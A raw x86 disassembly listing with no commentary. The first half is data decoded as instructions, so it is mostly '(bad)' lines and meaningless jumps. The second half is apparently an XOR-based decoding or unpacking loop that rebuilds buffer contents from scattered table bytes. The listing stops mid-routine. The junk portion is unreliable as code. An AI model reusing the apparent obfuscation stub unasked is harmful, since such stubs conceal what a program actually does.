  43fd51:	int3   
  43fd52:	(bad)  
  43fd53:	jmp    DWORD PTR [esi-0x3319fb01]
  43fd59:	call   DWORD PTR [ecx]
  43fd5b:	or     al,0xd0
  43fd5d:	add    BYTE PTR [eax],al
  43fd5f:	loop   0x43fd60
  43fd61:	(bad)  
  43fd62:	in     al,dx
  43fd63:	cmp    DWORD PTR [esi-0x1],0x6
  43fd67:	pop    ss
  43fd68:	(bad)  
  43fd69:	jmp    FWORD PTR [ecx]
  43fd6b:	test   eax,0x9fffffca
  43fd70:	(bad)  
  43fd71:	jmp    esp
  43fd73:	int3   
  43fd74:	cwde   
  43fd75:	add    BYTE PTR [edi+0x720089bc],dh
  43fd7b:	jo     0x43fd96
  43fd7d:	cmp    edi,0x4a
  43fd80:	dec    esp
  43fd82:	out    0x0,eax
  43fd84:	sub    BYTE PTR [eax],al
  43fd86:	add    ecx,DWORD PTR [ecx+0x1ae0089]
  43fd8c:	jmp    0x43fd8d
  43fd8e:	add    cl,dh
  43fd90:	inc    DWORD PTR [ebx-0x33ee00fa]
  43fd96:	fld    TBYTE PTR [ebp+0x2806ffff]
  43fd9c:	out    dx,eax
  43fd9d:	(bad)  
  43fd9e:	call   FWORD PTR [ecx-0x1]
  43fda1:	add    BYTE PTR [edi+edi*8],ah
  43fda4:	jp     0x43fd29
  43fda6:	xor    DWORD PTR [edx],esi
  43fda8:	inc    DWORD PTR [ebx-0x7a5646]
  43fdae:	add    BYTE PTR [ebx+eax*4],bl
  43fdb1:	call   FWORD PTR [ebp+0x0]
  43fdb4:	aad    0x83
  43fdb6:	nop
  43fdb7:	xor    eax,DWORD PTR [eax]
  43fdb9:	add    BYTE PTR ds:0x482f,ch
  43fdbf:	jmp    0xff33:0xe2ff00
  43fdc6:	sub    ch,bh
  43fdc8:	add    bh,bh
  43fdca:	mov    edx,0x89833292
  43fdcf:	inc    eax
  43fdd0:	inc    DWORD PTR [eax]
  43fdd2:	add    eax,0x44ff60ff
  43fdd7:	pusha  
  43fdd8:	inc    DWORD PTR [eax]
  43fdda:	dec    esi
  43fddb:	xchg   edx,eax
  43fddc:	pop    es
  43fddd:	(bad)  
  43fdde:	jmp    DWORD PTR [esi]
  43fde0:	dec    DWORD PTR [ecx-0x7c34003a]
  43fde6:	push   ebp
  43fde7:	jno    0x43fd6c
  43fde9:	(bad)  
  43fdea:	jmp    0xffc7a569
  43fdef:	xchg   DWORD PTR [eax],eax
  43fdf1:	call   FWORD PTR [ebx-0x427c4900]
  43fdf7:	dec    ecx
  43fdf8:	add    bh,bh
  43fdfa:	test   eax,0xff6de5
  43fdff:	into   
  43fe00:	inc    DWORD PTR [eax]
  43fe02:	ss dec ecx
  43fe05:	dec    DWORD PTR [edi+edx*1]
  43fe08:	add    DWORD PTR [ebx-0x3314be6c],0xffffff83
  43fe0f:	mov    bh,bh
  43fe11:	add    BYTE PTR [ebp+0x6b834889],cl
  43fe17:	or     edi,edi
  43fe19:	add    BYTE PTR [ebx+0x13],al
  43fe1c:	mov    ds:0x4fff00,al
  43fe21:	add    bl,cl
  43fe23:	add    BYTE PTR [edi+edi*8-0xfffcc4],ah
  43fe2a:	imul   esi,DWORD PTR [eax-0x660000f9],0xffffffff
  43fe31:	dec    DWORD PTR [edx-0x1]
  43fe34:	stos   DWORD PTR es:[edi],eax
  43fe35:	add    BYTE PTR [esi+ecx*8],ch
  43fe38:	(bad)  
  43fe39:	jmp    FWORD PTR [esi+0x4a]
  43fe3c:	pop    ecx
  43fe3d:	(bad)  
  43fe3e:	(bad)  
  43fe3f:	fiadd  WORD PTR [eax]
  43fe41:	call   FWORD PTR [ebx]
  43fe43:	dec    DWORD PTR [esi]
  43fe45:	cmp    DWORD PTR [ebx-0x8],0x0
  43fe49:	add    BYTE PTR [ecx+0x5f],dh
  43fe4c:	mov    es,WORD PTR [eax]
  43fe4e:	cmp    DWORD PTR [esi-0x1],0xffffffff
  43fe52:	dec    esi
  43fe53:	add    BYTE PTR [ebx],ch
  43fe55:	and    DWORD PTR [ebx+ebp*8],0xffffff83
  43fe59:	sub    DWORD PTR [esi+edx*4-0x2f],0x0
  43fe5e:	add    dh,dl
  43fe60:	(bad)  
  43fe61:	jmp    FWORD PTR [ebp-0x77]
  43fe64:	mov    ecx,0x890a0983
  43fe69:	dec    DWORD PTR [eax-0x59]
  43fe6c:	xchg   BYTE PTR [ecx-0x7c9501],cl
  43fe72:	pop    ecx
  43fe73:	int3   
  43fe74:	jo     0x43fdf9
  43fe76:	xchg   DWORD PTR [eax-0x1],ecx
  43fe79:	jmp    FWORD PTR [ebp+esi*1-0x17c005d]
  43fe80:	add    bh,bh
  43fe82:	imul   eax,DWORD PTR [eax],0xffffff94
  43fe85:	(bad)  
  43fe86:	jl     0x43fe42
  43fe88:	int3   
  43fe89:	push   DWORD PTR [ebx]
  43fe8b:	fs inc DWORD PTR ss:[eax]
  43fe8f:	scas   al,BYTE PTR es:[edi]
  43fe90:	(bad)  
  43fe91:	call   DWORD PTR [edx-0x34]
  43fe94:	and    BYTE PTR [ebx-0x3376f9ef],al
  43fe9a:	jno    0x43fe68
  43fe9c:	in     al,dx
  43fe9d:	or     esp,0xffffff92
  43fea0:	add    bh,bh
  43fea2:	lds    ecx,FWORD PTR [ecx-0x3a6f00ea]
  43fea8:	mov    DWORD PTR [ebx-0xe07e19],eax
  43feae:	add    DWORD PTR [edi-0x1],0xffffffff
  43feb2:	sahf   
  43feb3:	(bad)  
  43feb4:	jl     0x43feb5
  43feb6:	or     ecx,esp
  43feb8:	add    DWORD PTR [eax],0x70
  43febb:	cmc    
  43febc:	jl     0x43fe41
  43febe:	(bad)  
  43febf:	sti    
  43fec0:	cmp    edi,0xfffffffa
  43fec3:	add    bl,ch
  43fec5:	add    BYTE PTR [ebx+edx*1-0x1],ah
  43fec9:	push   ecx
  43fecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fecc:	call   0xcdff:0xff2800cc
  43fed3:	(bad)  
  43fed4:	mov    edi,0xff9e54ff
  43fed9:	xor    DWORD PTR [eax+0xff776b],0x70
  43fee0:	inc    DWORD PTR [eax]
  43fee2:	fmul   QWORD PTR [ecx-0x2740ff62]
  43fee8:	inc    DWORD PTR [ebx-0xdef3aa]
  43feee:	jmp    DWORD PTR [edi-0x1]
  43fef1:	add    bh,ch
  43fef3:	(bad)  
  43fef4:	mov    ebx,0xff820000
  43fef9:	(bad)  
  43fefa:	cld    
  43fefb:	sbb    eax,0xf100ff1c
  43ff00:	(bad)  
  43ff01:	call   DWORD PTR [esi-0x1]
  43ff04:	test   al,0x0
  43ff06:	or     BYTE PTR [eax-0x59c6ff77],bh
  43ff0c:	cmp    al,BYTE PTR [ebx-0x5801]
  43ff12:	or     eax,0xc7ccdaff
  43ff17:	retf   
  43ff18:	inc    DWORD PTR [eax]
  43ff1a:	cmp    cl,bl
  43ff1c:	loopne 0x43ff1e
  43ff1e:	add    bh,ch
  43ff20:	dec    esp
  43ff22:	imul   edi,edi,0x6f
  43ff25:	sbb    DWORD PTR [ecx],0x2e
  43ff28:	add    bh,bh
  43ff2a:	ror    DWORD PTR [edx-0x30],0xff
  43ff2e:	add    BYTE PTR [eax-0x1],ch
  43ff31:	add    bl,ah
  43ff33:	(bad)  
  43ff34:	(bad)  
  43ff35:	call   DWORD PTR [eax+0x41]
  43ff38:	inc    DWORD PTR [eax]
  43ff3a:	cmp    al,0xbc
  43ff3c:	mov    bh,bh
  43ff3e:	add    BYTE PTR [eax],al
  43ff40:	inc    DWORD PTR [ebx-0xb000b4]
  43ff46:	das    
  43ff47:	jmp    0x43ff48
  43ff49:	add    BYTE PTR [edx-0x46],bh
  43ff4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ff4d:	int3   
  43ff4e:	and    DWORD PTR [esi+0x5f83ff],0xb
  43ff55:	mov    DWORD PTR [ebx-0x7],esi
  43ff58:	int3   
  43ff59:	push   DWORD PTR [eax-0x63]
  43ff5c:	jge    0x43ff5d
  43ff5e:	(bad)  
  43ff5f:	call   0xe30030
  43ff64:	(bad)  
  43ff65:	call   DWORD PTR [edx+eiz*8]
  43ff68:	(bad)  
  43ff69:	call   FWORD PTR [edi+0xa36c]
  43ff6f:	dec    edi
  43ff70:	dec    esp
  43ff72:	inc    edx
  43ff73:	call   eax
  43ff75:	call   edx
  43ff77:	jecxz  0x43fefc
  43ff79:	dec    DWORD PTR [edx-0x1a]
  43ff7c:	mov    eax,ds:0xcc1affff
  43ff81:	call   DWORD PTR [edi-0x1]
  43ff84:	adc    eax,0xff3c6a00
  43ff89:	add    BYTE PTR [esi],al
  43ff8b:	pop    esi
  43ff8c:	mov    ecx,0x8398ffff
  43ff91:	add    BYTE PTR [eax-0x2400b57d],bh
  43ff97:	xchg   ebp,eax
  43ff98:	mov    DWORD PTR [eax],eax
  43ff9a:	loope  0x43ffe5
  43ff9c:	cmp    DWORD PTR [ecx-0x7cc500],ecx
  43ffa2:	dec    esi
  43ffa3:	dec    DWORD PTR [edx-0x1]
  43ffa6:	cmc    
  43ffa7:	jg     0x43ff2c
  43ffa9:	add    BYTE PTR [esp+eiz*2],dh
  43ffac:	jge    0x43ffad
  43ffae:	(bad)  
  43ffaf:	in     al,dx
  43ffb0:	add    BYTE PTR [eax],al
  43ffb2:	jno    0x43ff37
  43ffb4:	fdiv   st(7),st
  43ffb6:	ds mov bh,bh
  43ffb9:	(bad)  
  43ffba:	jge    0x43ffcf
  43ffbc:	sahf   
  43ffbd:	cmp    edi,0xb
  43ffc0:	add    bh,bh
  43ffc2:	(bad)  
  43ffc3:	int3   
  43ffc4:	mov    esp,0x836b02ff
  43ffc9:	inc    DWORD PTR [esi+0x6026]
  43ffcf:	lds    eax,FWORD PTR [eax]
  43ffd1:	int3   
  43ffd2:	leave  
  43ffd3:	dec    DWORD PTR [ebx]
  43ffd5:	jmp    FWORD PTR [ecx]
  43ffd7:	push   edi
  43ffd8:	add    BYTE PTR [eax],al
  43ffda:	mov    ds:0x89009bf2,eax
  43ffdf:	retf   0x8300
  43ffe2:	push   ebx
  43ffe3:	dec    DWORD PTR ds:0x8cdcff
  43ffe9:	jmp    DWORD PTR [esi]
  43ffeb:	jnp    0x440046
  43ffed:	add    DWORD PTR [ebx+0x48ff0073],0xffffffff
  43fff4:	pusha  
  43fff5:	cmp    DWORD PTR [esi+0x67],0x0
  43fff9:	add    BYTE PTR [ecx],bl
  43fffb:	xchg   esi,eax
  43fffc:	loope  0x43ff87
  43fffe:	add    BYTE PTR [eax-0x7d],ch
  440001:	call   FWORD PTR [esi+0xcff21ff]
  440007:	rol    DWORD PTR [ebx-0xaa96477],1
  44000d:	inc    DWORD PTR [eax]
  44000f:	mov    WORD PTR [eax],es
  440011:	jmp    DWORD PTR [eax-0xd002a01]
  440017:	rol    DWORD PTR [ebx+0x1705a100],1
  44001d:	(bad)  
  44001e:	inc    edx
  440020:	mov    edi,edi
  440022:	ret    0xcfff
  440025:	add    BYTE PTR [ebx-0x70],bh
  440028:	add    BYTE PTR [ebx+0xf268bf],al
  44002e:	sub    DWORD PTR [ebp-0x42007d],0x43
  440035:	jmp    FWORD PTR [ecx+0x79ccfffa]
  44003b:	pop    edi
  44003c:	(bad)  
  44003d:	int3   
  44003e:	mov    DWORD PTR [ebx+eax*4+0x41ffb300],esi
  440045:	jmp    FWORD PTR [esi]
  440047:	cdq    
  440048:	add    BYTE PTR [eax],al
  44004a:	into   
  44004b:	push   ecx
  44004c:	enter  0xffff,0xee
  440050:	(bad)  
  440051:	(bad)  
  440052:	cmp    al,0xff
  440054:	mov    DWORD PTR [ecx-0x17c5],ecx
  44005a:	dec    BYTE PTR [ebp+0x1e0083fc]
  440060:	inc    DWORD PTR [eax]
  440062:	cmp    eax,0x8bff0a89
  440067:	add    al,0xff
  440069:	jmp    FWORD PTR [ebx]
  44006b:	ins    DWORD PTR es:[edi],dx
  44006c:	sbb    DWORD PTR [eax],eax
  44006e:	add    BYTE PTR [edx+0x67ff89],dh
  440074:	cmp    edi,0xffffff98
  440077:	in     al,0xff
  440079:	(bad)  
  44007a:	cmp    DWORD PTR [edx+0x2f00fffd],ebx
  440080:	dec    esp
  440082:	stos   BYTE PTR es:[edi],al
  440083:	add    ch,dl
  440085:	adc    edi,0xffffffa8
  440088:	add    DWORD PTR [eax],0xffffffd0
  44008b:	inc    esp
  44008c:	xchg   bh,bh
  44008e:	jmp    FWORD PTR [ecx-0x317c01]
  440094:	and    edi,edi
  440096:	push   eax
  440097:	sub    edi,edi
  440099:	(bad)  
  44009a:	fisubr DWORD PTR [edx-0x28]
  44009d:	add    BYTE PTR [ebx-0x770000de],al
  4400a3:	add    eax,0x0
  4400a6:	stos   DWORD PTR es:[edi],eax
  4400a7:	or     BYTE PTR [ecx-0x8d37801],cl
  4400ad:	inc    DWORD PTR [ebx-0x42ff7c93]
  4400b3:	call   DWORD PTR [edi+edi*8]
  4400b6:	clc    
  4400b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4400b8:	add    DWORD PTR [eax],0x4
  4400bb:	test   DWORD PTR [ebx-0x1],esi
  4400be:	jmp    FWORD PTR [eax-0x34]
  4400c1:	call   DWORD PTR [eax]
  4400c3:	add    ch,dl
  4400c5:	add    edx,0xffffff92
  4400c8:	add    bh,bh
  4400ca:	xlat   BYTE PTR ds:[ebx]
  4400cb:	pushf  
  4400cc:	inc    ebx
  4400cd:	inc    DWORD PTR [eax]
  4400cf:	adc    bh,bh
  4400d1:	(bad)  
  4400d2:	jnp    0x440057
  4400d4:	mov    al,ds:0xff50dc83
  4400d9:	add    BYTE PTR [edx-0x337c5edf],ah
  4400df:	inc    eax
  4400e0:	(bad)  
  4400e1:	(bad)  
  4400e2:	mov    edx,0xdaffc700
  4400e7:	xchg   edi,eax
  4400e8:	int3   
  4400e9:	push   DWORD PTR [eax-0x68]
  4400ec:	dec    esp
  4400ed:	mov    DWORD PTR [ebx-0x7200008b],eax
  4400f3:	(bad)  
  4400f4:	mov    ebx,0x89af7689
  4400f9:	inc    DWORD PTR [ecx-0xb6b0]
  4400ff:	jae    0x440101
  440101:	xor    DWORD PTR [edi-0x56004201],0x60
  440108:	add    bh,bh
  44010a:	mov    ch,0xf1
  44010c:	mov    ch,0x0
  44010e:	call   DWORD PTR [eax-0x76950001]
  440114:	and    DWORD PTR [eax],eax
  440116:	pop    esp
  440117:	(bad)  
  440119:	add    bl,dl
  44011b:	scas   eax,DWORD PTR es:[edi]
  44011c:	or     DWORD PTR [eax],eax
  44011e:	add    BYTE PTR [edi+edi*8+0x0],ch
  440122:	arpl   di,di
  440124:	imul   edi,edi,0x5c43
  44012a:	in     eax,dx
  44012b:	loopne 0x4400c6
  44012d:	(bad)  
  44012e:	(bad)  
  44012f:	mov    ebx,0x8367ff00
  440134:	pop    esi
  440135:	mov    DWORD PTR ds:0x3bffffd5,ecx
  44013b:	std    
  44013c:	push   ebx
  44013d:	add    BYTE PTR [eax],al
  44013f:	and    al,0x0
  440141:	mov    DWORD PTR [ebp-0x5700cb01],ebp
  440147:	or     edi,edi
  440149:	mov    edi,ecx
  44014b:	int3   
  44014c:	sbb    bh,bh
  44014e:	jmp    FWORD PTR [ebx]
  440150:	inc    DWORD PTR [eax]
  440152:	aad    0xff
  440154:	dec    ecx
  440155:	add    BYTE PTR [edi-0x6b],bl
  440158:	or     DWORD PTR [ecx-0x763b68],0xffffffff
  44015f:	dec    ah
  440161:	(bad)  
  440162:	jp     0x440130
  440164:	mov    esp,0x304dcc
  440169:	jmp    FWORD PTR [esi+0xffc99a]
  44016f:	lock inc DWORD PTR [ebx-0x917ced]
  440176:	aam    0xd1
  440178:	int3   
  440179:	push   DWORD PTR [edx]
  44017b:	push   edi
  44017c:	nop
  44017d:	add    BYTE PTR [eax],al
  44017f:	in     eax,0xff
  440181:	add    DWORD PTR [edx],0x0
  440184:	add    BYTE PTR fs:[edx-0x5300ffa3],cl
  44018b:	cmp    dh,ah
  44018d:	(bad)  
  44018e:	inc    DWORD PTR [ecx-0x766a3400]
  440194:	or     edi,edi
  440196:	fcom   QWORD PTR [esi]
  440198:	add    BYTE PTR [eax],al
  44019a:	jo     0x44012b
  44019c:	jne    0x44019d
  44019e:	xor    DWORD PTR ds:0xff848983,0x3
  4401a5:	push   DWORD PTR [ebx-0x4e]
  4401a8:	(bad)  
  4401a9:	dec    DWORD PTR [esp+ebp*8-0x6e]
  4401ad:	inc    DWORD PTR [eax]
  4401af:	pop    esi
  4401b0:	int3   
  4401b1:	add    al,al
  4401b3:	(bad)  
  4401b4:	call   0x7a7db8
  4401b9:	add    BYTE PTR [edx],bh
  4401bb:	mov    WORD PTR [ebp-0x7cfd0001],?
  4401c1:	call   FWORD PTR [ebp+0x42ff1bcc]
  4401c7:	inc    edx
  4401c8:	(bad)  
  4401c9:	call   edx
  4401cb:	dec    edi
  4401cc:	pusha  
  4401cd:	(bad)  
  4401ce:	(bad)  
  4401cf:	cld    
  4401d0:	(bad)  
  4401d1:	push   DWORD PTR [ecx+0x0]
  4401d4:	xchg   ebx,eax
  4401d5:	add    cl,dl
  4401d7:	inc    eax
  4401d8:	add    bh,bh
  4401da:	(bad)  
  4401dc:	loopne 0x4401dd
  4401de:	add    BYTE PTR [edx],bl
  4401e0:	int3   
  4401e1:	call   FWORD PTR [edx+0x0]
  4401e4:	adc    DWORD PTR [ecx+0xcc08],ecx
  4401ea:	jmp    0x4401c1
  4401ec:	dec    edi
  4401ed:	inc    DWORD PTR [eax]
  4401ef:	(bad)  
  4401f1:	add    BYTE PTR [eax],cl
  4401f3:	jmp    FWORD PTR [esi-0x7c48047d]
  4401f9:	int3   
  4401fa:	aaa    
  4401fb:	pop    esi
  4401fc:	cdq    
  4401fd:	(bad)  
  4401fe:	jmp    DWORD PTR [esi-0x34]
  440201:	add    bh,cl
  440203:	(bad)  
  440204:	fcmove st,st(4)
  440206:	call   0x67440155
  44020b:	sbb    bh,BYTE PTR [eax-0xd60000]
  440211:	push   DWORD PTR [eax+eax*1-0x186f7673]
  440218:	(bad)  
  440219:	dec    ecx
  44021b:	pop    esi
  44021c:	xlat   BYTE PTR ds:[ebx]
  44021d:	(bad)  
  44021e:	call   FWORD PTR [edx+0xf400ff]
  440224:	rol    DWORD PTR [ebx-0x49c9],cl
  44022a:	sub    BYTE PTR ds:0x1aff0077,ch
  440230:	or     esp,0xffffff90
  440233:	(bad)  
  440234:	jns    0x440235
  440236:	xchg   bl,al
  440238:	(bad)  
  440239:	inc    DWORD PTR [eax+0x41]
  44023c:	es add bh,bh
  44023f:	fld    QWORD PTR [eax]
  440241:	add    BYTE PTR [ebx],bh
  440243:	call   FWORD PTR [eax+eax*1-0xfb6d]
  44024a:	ffree  st(7)
  44024c:	sub    eax,DWORD PTR [eax]
  44024e:	jmp    FWORD PTR [eax+eax*1+0x548397ff]
  440255:	add    BYTE PTR [edx+0x9ffff71],ah
  44025b:	daa    
  44025c:	loop   0x4401e1
  44025e:	add    BYTE PTR [ebp-0x1],dl
  440261:	jmp    FWORD PTR [edi]
  440263:	jmp    edi
  440265:	jmp    DWORD PTR [ebp+0x2500ffe3]
  44026b:	std    
  44026c:	mov    bh,bh
  44026e:	dec    DWORD PTR [edx-0x640034]
  440274:	mov    ecx,0x83a31cff
  440279:	mov    edi,edi
  44027b:	(bad)  
  44027c:	(bad)  
  44027d:	dec    esp
  44027f:	call   DWORD PTR [ebx+0x56]
  440282:	push   edi
  440283:	push   0x4c
  440285:	push   0x42
  440287:	call   DWORD PTR ds:0x445014
  44028d:	mov    edx,DWORD PTR ds:0x448d20
  440293:	mov    ecx,DWORD PTR ds:0x448098
  440299:	mov    edi,eax
  44029b:	add    edx,0x97b8
  4402a1:	mov    esi,0x251
  4402a6:	jmp    0x4402b0
  4402a8:	lea    esp,[esp+0x0]
  4402af:	nop
  4402b0:	movzx  eax,BYTE PTR [ecx+0x5]
  4402b4:	movzx  ebx,WORD PTR [ecx+0x3]
  4402b8:	movzx  ecx,BYTE PTR [ecx]
  4402bb:	shl    eax,0x10
  4402be:	add    eax,ebx
  4402c0:	shl    eax,0x8
  4402c3:	add    eax,ecx
  4402c5:	mov    ecx,0xaad877ec
  4402ca:	sub    ecx,DWORD PTR ds:0x448d1c
  4402d0:	mov    ds:0x448d10,eax
  4402d5:	xor    ecx,eax
  4402d7:	mov    DWORD PTR [edx],ecx
  4402d9:	mov    ecx,DWORD PTR ds:0x448098
  4402df:	add    ecx,0x8
  4402e2:	add    edx,0x4
  4402e5:	dec    esi
  4402e6:	mov    DWORD PTR ds:0x448098,ecx
  4402ec:	jne    0x4402b0
  4402ee:	mov    ecx,DWORD PTR ds:0x448d20
  4402f4:	mov    edx,DWORD PTR ds:0x44809c
  4402fa:	add    ecx,0xa0fc
  440300:	mov    esi,0xa9
  440305:	jmp    0x440310
  440307:	lea    esp,[esp+0x0]
  44030e:	mov    edi,edi
  440310:	movzx  eax,BYTE PTR [edx+0x6]
  440314:	movzx  ebx,BYTE PTR [edx+0x4]
  440318:	movzx  edx,WORD PTR [edx+0x2]
  44031c:	shl    eax,0x8
  44031f:	add    eax,ebx
  440321:	shl    eax,0x10
  440324:	add    eax,edx
  440326:	mov    edx,DWORD PTR ds:0x448d1c
  44032c:	sub    edx,0x401e6
  440332:	neg    edx
  440334:	sbb    edx,edx
  440336:	and    edx,0x4f2f3f9c
  44033c:	add    edx,0xb0d1a32c
  440342:	xor    edx,eax
  440344:	mov    ds:0x448d10,eax
  440349:	mov    DWORD PTR [ecx],edx
  44034b:	mov    edx,DWORD PTR ds:0x44809c
  440351:	movzx  eax,WORD PTR [edx+0xe]
  440355:	movzx  ebx,BYTE PTR [edx+0xc]
  440359:	movzx  edx,BYTE PTR [edx+0x8]
  44035d:	shl    eax,0x8
  440360:	add    eax,ebx
  440362:	shl    eax,0x8
  440365:	add    eax,edx
  440367:	mov    edx,DWORD PTR ds:0x448d1c
  44036d:	sub    edx,0x401e6
  440373:	neg    edx
  440375:	sbb    edx,edx
  440377:	and    edx,0x4f2f32b5
  44037d:	add    edx,0xb0d1a32c
  440383:	xor    edx,eax
  440385:	mov    ds:0x448d10,eax
  44038a:	mov    DWORD PTR [ecx+0x4],edx
  44038d:	mov    edx,DWORD PTR ds:0x44809c
  440393:	add    edx,0x10
  440396:	add    ecx,0x8
  440399:	dec    esi
  44039a:	mov    DWORD PTR ds:0x44809c,edx
  4403a0:	jne    0x440310
  4403a6:	mov    eax,ds:0x448d20
  4403ab:	mov    edx,DWORD PTR ds:0x4480a0
  4403b1:	add    eax,0xa644
  4403b6:	mov    esi,0x37
  4403bb:	jmp    0x4403c0
  4403bd:	lea    ecx,[ecx+0x0]
  4403c0:	movzx  ecx,BYTE PTR [edx+0x7]
  4403c4:	movzx  ebx,BYTE PTR [edx+0x4]
  4403c8:	movzx  edx,WORD PTR [edx+0x1]
  4403cc:	shl    ecx,0x8
  4403cf:	add    ecx,ebx
  4403d1:	shl    ecx,0x10
  4403d4:	add    ecx,edx
  4403d6:	mov    edx,DWORD PTR ds:0x448d1c
  4403dc:	mov    DWORD PTR ds:0x448d10,ecx
  4403e2:	add    edx,0xd59166f7
  4403e8:	xor    edx,ecx
  4403ea:	mov    DWORD PTR [eax],edx
  4403ec:	mov    edx,DWORD PTR ds:0x4480a0
  4403f2:	add    edx,0x8
  4403f5:	mov    DWORD PTR ds:0x4480a0,edx
  4403fb:	movzx  ecx,BYTE PTR [edx+0x7]
  4403ff:	movzx  ebx,BYTE PTR [edx+0x4]
  440403:	movzx  edx,WORD PTR [edx+0x1]
  440407:	shl    ecx,0x8
  44040a:	add    ecx,ebx
  44040c:	shl    ecx,0x10
  44040f:	add    ecx,edx
  440411:	mov    edx,DWORD PTR ds:0x448d1c
  440417:	mov    DWORD PTR ds:0x448d10,ecx
  44041d:	add    edx,0xd59166f7
  440423:	xor    edx,ecx
  440425:	mov    DWORD PTR [eax+0x4],edx
  440428:	mov    edx,DWORD PTR ds:0x4480a0
  44042e:	add    edx,0x8
  440431:	mov    DWORD PTR ds:0x4480a0,edx
  440437:	movzx  ecx,BYTE PTR [edx+0x7]
  44043b:	movzx  ebx,BYTE PTR [edx+0x4]
  44043f:	movzx  edx,WORD PTR [edx+0x1]
  440443:	shl    ecx,0x8
  440446:	add    ecx,ebx
  440448:	shl    ecx,0x10
  44044b:	add    ecx,edx
  44044d:	mov    edx,DWORD PTR ds:0x448d1c
  440453:	mov    DWORD PTR ds:0x448d10,ecx
  440459:	add    edx,0xd59166f7
  44045f:	xor    edx,ecx
  440461:	mov    DWORD PTR [eax+0x8],edx
  440464:	mov    edx,DWORD PTR ds:0x4480a0
  44046a:	add    edx,0x8
  44046d:	mov    DWORD PTR ds:0x4480a0,edx
  440473:	movzx  ecx,BYTE PTR [edx+0x7]
  440477:	movzx  ebx,BYTE PTR [edx+0x4]
  44047b:	movzx  edx,WORD PTR [edx+0x1]
  44047f:	shl    ecx,0x8
  440482:	add    ecx,ebx
  440484:	shl    ecx,0x10
  440487:	add    ecx,edx
  440489:	mov    edx,DWORD PTR ds:0x448d1c
  44048f:	mov    DWORD PTR ds:0x448d10,ecx
  440495:	add    edx,0xd59166f7
  44049b:	xor    edx,ecx
  44049d:	mov    DWORD PTR [eax+0xc],edx
  4404a0:	mov    edx,DWORD PTR ds:0x4480a0
  4404a6:	add    edx,0x8
  4404a9:	mov    DWORD PTR ds:0x4480a0,edx
  4404af:	movzx  ecx,BYTE PTR [edx+0x7]
  4404b3:	movzx  ebx,BYTE PTR [edx+0x4]
  4404b7:	movzx  edx,WORD PTR [edx+0x1]
  4404bb:	shl    ecx,0x8
  4404be:	add    ecx,ebx
  4404c0:	shl    ecx,0x10
  4404c3:	add    ecx,edx
  4404c5:	mov    edx,DWORD PTR ds:0x448d1c
  4404cb:	add    edx,0xd59166f7
  4404d1:	xor    edx,ecx
  4404d3:	mov    DWORD PTR ds:0x448d10,ecx
  4404d9:	mov    DWORD PTR [eax+0x10],edx
  4404dc:	mov    edx,DWORD PTR ds:0x4480a0
  4404e2:	add    edx,0x8
  4404e5:	mov    DWORD PTR ds:0x4480a0,edx
  4404eb:	movzx  ecx,BYTE PTR [edx+0x7]
  4404ef:	movzx  ebx,BYTE PTR [edx+0x4]
  4404f3:	movzx  edx,WORD PTR [edx+0x1]
  4404f7:	shl    ecx,0x8
  4404fa:	add    ecx,ebx
  4404fc:	shl    ecx,0x10
  4404ff:	add    ecx,edx
  440501:	mov    edx,DWORD PTR ds:0x448d1c
  440507:	add    edx,0xd59166f7
  44050d:	xor    edx,ecx
  44050f:	mov    DWORD PTR ds:0x448d10,ecx
  440515:	mov    DWORD PTR [eax+0x14],edx
  440518:	mov    edx,DWORD PTR ds:0x4480a0
  44051e:	add    edx,0x8
  440521:	add    eax,0x18
  440524:	dec    esi
  440525:	mov    DWORD PTR ds:0x4480a0,edx
  44052b:	jne    0x4403c0
  440531:	push   esi
  440532:	call   DWORD PTR ds:0x445024
  440538:	mov    eax,ds:0x448d20
  44053d:	mov    edx,DWORD PTR ds:0x4480a4
  440543:	add    eax,0xab6c
  440548:	mov    esi,0xb3
  44054d:	lea    ecx,[ecx+0x0]
  440550:	movzx  ecx,BYTE PTR [edx+0xa]
  440554:	movzx  ebx,BYTE PTR [edx+0x4]
  440558:	movzx  edx,WORD PTR [edx]
  44055b:	shl    ecx,0x8
  44055e:	add    ecx,ebx
  440560:	shl    ecx,0x10
  440563:	add    ecx,edx
  440565:	mov    edx,DWORD PTR ds:0x448d1c
  44056b:	add    edx,0xd7cbac2f
  440571:	xor    edx,ecx
  440573:	mov    DWORD PTR ds:0x448d10,ecx
  440579:	mov    DWORD PTR [eax],edx
  44057b:	mov    ecx,DWORD PTR ds:0x4480a4
  440581:	mov    ecx,DWORD PTR [ecx+0xc]
  440584:	mov    edx,DWORD PTR ds:0x448d1c
  44058a:	add    edx,0xd7cbac2f
  440590:	xor    edx,ecx
  440592:	mov    DWORD PTR ds:0x448d10,ecx
  440598:	mov    DWORD PTR [eax+0x4],edx
  44059b:	mov    edx,DWORD PTR ds:0x4480a4
  4405a1:	add    edx,0x10
  4405a4:	mov    DWORD PTR ds:0x4480a4,edx
  4405aa:	movzx  ecx,BYTE PTR [edx+0xa]
  4405ae:	movzx  ebx,BYTE PTR [edx+0x4]
  4405b2:	movzx  edx,WORD PTR [edx]
  4405b5:	shl    ecx,0x8
  4405b8:	add    ecx,ebx
  4405ba:	shl    ecx,0x10
  4405bd:	add    ecx,edx
  4405bf:	mov    edx,DWORD PTR ds:0x448d1c
  4405c5:	add    edx,0xd7cbac2f
  4405cb:	xor    edx,ecx
  4405cd:	mov    DWORD PTR ds:0x448d10,ecx
  4405d3:	mov    DWORD PTR [eax+0x8],edx
  4405d6:	mov    ecx,DWORD PTR ds:0x4480a4
  4405dc:	mov    ecx,DWORD PTR [ecx+0xc]
  4405df:	mov    edx,DWORD PTR ds:0x448d1c
  4405e5:	add    edx,0xd7cbac2f
  4405eb:	xor    edx,ecx
  4405ed:	mov    DWORD PTR ds:0x448d10,ecx
  4405f3:	mov    DWORD PTR [eax+0xc],edx
  4405f6:	mov    edx,DWORD PTR ds:0x4480a4
  4405fc:	add    edx,0x10
  4405ff:	add    eax,0x10
  440602:	dec    esi
  440603:	mov    DWORD PTR ds:0x4480a4,edx
  440609:	jne    0x440550
  44060f:	movzx  ecx,BYTE PTR [edx+0xa]
  440613:	movzx  esi,BYTE PTR [edx+0x4]
  440617:	movzx  edx,WORD PTR [edx]
  44061a:	shl    ecx,0x8
  44061d:	add    ecx,esi
  44061f:	shl    ecx,0x10
  440622:	add    ecx,edx
  440624:	mov    edx,0xd7d3affb
  440629:	sub    edx,DWORD PTR ds:0x448d1c
